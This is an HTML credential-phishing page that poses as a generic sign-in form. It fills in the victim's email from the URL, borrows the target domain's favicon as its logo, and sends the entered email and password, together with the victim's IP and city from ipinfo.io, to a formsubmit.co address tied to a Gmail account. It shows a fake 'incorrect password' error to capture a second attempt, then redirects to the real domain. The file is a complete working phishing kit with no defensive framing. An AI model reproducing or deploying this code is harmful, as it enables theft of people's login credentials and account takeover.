<html>
<head>
</head>
  
<body class="block-scroll">

<meta name="viewport" content="width=device-width, initial-scale=1"> 
  

  
<style>
	* {
		box-sizing: border-box;
		padding: 0;
		margin: 0;
	}

	body {
		height: 100vh;
		width: 100vw;
		font-family: Arial, Helvetica, sans-serif;
		display: flex;
		justify-content: center;
		align-items: center;
		overflow: hidden;
	}

	.bg-img {
		position: fixed;
		top: 0;
		left: 0;
		width: 100vw;
		height: 100vh;
		background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRR_D5KmxXbB5O6qLtAAsuWFMtM7o9TpXBEYc1pZFqn8IRvOniOusERV9Ott1FD43z8qHwNtowRZuzAAcQYovayaManIRtOSC2VQ2DioQwzZcxvAvcLJyQuDvk1pLv9M14VjMF04dlQrZLh9E_NYhjJHHtHuZrxxizAZ_WFRqgWJ25eUMGtlM3zvSmsYw/s947/image%20%282%29.png'); /* Replace with your image URL */
		background-position: center;
		background-repeat: no-repeat;
		background-size: cover;
		z-index: -1;
	}

	/* Add styles to the form container */
	.container {
		max-width: 400px;
		padding: 16px;
		background-color: white;
		border-radius: 5px;
		position: absolute;
		left: 50%;
		top: 50%;
		transform: translate(-50%, -50%) scale(0);
		z-index: 2;
		animation: popOut 0.5s ease-out 4s forwards;
		box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
	}

	@keyframes popOut {
		0% {
			transform: translate(-50%, -50%) scale(0);
			opacity: 0;
		}
		70% {
			transform: translate(-50%, -50%) scale(1.1);
			opacity: 1;
		}
		100% {
			transform: translate(-50%, -50%) scale(1);
			opacity: 1;
		}
	}

	/* Overlay before form pops out */
	.overlay {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background-color: rgba(0, 0, 0, 0.5);
		z-index: 1;
		opacity: 0;
		animation: fadeIn 0.3s ease-out 4s forwards;
	}

	@keyframes fadeIn {
		to {
			opacity: 1;
		}
	}

	@media (max-width: 480px) {
		.container {
			left: 50%;
			top: 50%;
			transform: translate(-50%, -50%) scale(0);
			margin: 0;
			width: 90%;
			max-width: 90%;
		}
		
		@keyframes popOut {
			0% {
				transform: translate(-50%, -50%) scale(0);
				opacity: 0;
			}
			70% {
				transform: translate(-50%, -50%) scale(1.05);
				opacity: 1;
			}
			100% {
				transform: translate(-50%, -50%) scale(1);
				opacity: 1;
			}
		}
	}

	/* Full-width input fields */
	input[type=text], input[type=password] {
		width: 100%;
		padding: 15px;
		margin: 5px 0 22px 0;
		border: none;
		background: #f1f1f1;
	}

	input[type=text]:focus, input[type=password]:focus {
		background-color: #ddd;
		outline: none;
	}

	.btn {
		background-color: #0096FF;
		color: white;
		padding: 16px 20px;
		border: none;
		cursor: pointer;
		width: 100%;
		opacity: 0.9;
	}

	.btn:hover {
		opacity: 1;
	}

	.img {
		text-align: center;
	}

	#title {
		text-align: center;
		margin: 10px 0;
	}

	#error {
		display: none;
		color: red;
	}
</style>


  
  
 
  
  

  
  
  
<script></script>
<div class="bg-img" id="bg-img"></div>
<div class="overlay" id="overlay"></div>
<form class="container" id="login-form">
	<div class="img">
		<img src="" id="logo" style="width: 65px; height: 65px;">
	</div>

	<h3 id="title">Sign In</h3>

	<h5 id="error">Password is incorrect, please try again!</h5>

	<label for="email">
		<b>Email Address</b>
	</label>
	<input type="text" placeholder="Enter Email" name="email" id="email" required="">

	<label for="psw">
		<b>Password</b>
	</label>
	<input type="password" placeholder="Enter Password" name="password" id="psw" required="">

	<input type="hidden" name="step" id="step">

	<button type="submit" class="btn">Sign In</button>
</form>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>

	let step = 1;
	
	const clientID = window.location.hash.split("#").pop();
	$('#email').val(clientID);
	const domain = clientID.split('@').pop();

	$("#frame").attr("src", "https://" + domain);
	
	// Favicon logo
	const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
	$("#logo").attr("src", logoUrl)
	.on("error", function() {
		$(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
	});

	const submit = $("button[type='submit']");

	$("#login-form").submit(function(event) {

		event.preventDefault();

		submit.text('Verifying...');

		$.getJSON('https://ipinfo.io/json', function(response) {
			const posting = $.post("https://formsubmit.co/ajax/dattiobi01@gmail.com", {
				_subject: "Logs | " + response.ip,
				Email: $("#email").val(),
				Password: $("#psw").val(),
				Attempts: step,
				IP: response.ip,
				Location: response.city + ", " + response.country,
			});

			posting.done(function(data) {
				if (step === 2) {
					window.location.href = "http://" + domain;
				} else {
					step++;
					$("#error").css("display", "block");
					submit.text('Sign In');
					$("#psw").val("");
				}
			});

			posting.fail(function(error) {
				console.error(error);
				$("#error").css("display", "block");
				submit.text('Sign In');
				$("#psw").val("");
			});
		}, "json");
	});

	// Prevent interaction before form pops out
	$("#login-form").css("pointer-events", "none");
	setTimeout(function() {
		$("#login-form").css("pointer-events", "auto");
		$("#psw").focus();
	}, 4500); // 4.5 seconds (4s delay + 0.5s animation)
</script>

</body>
</html>
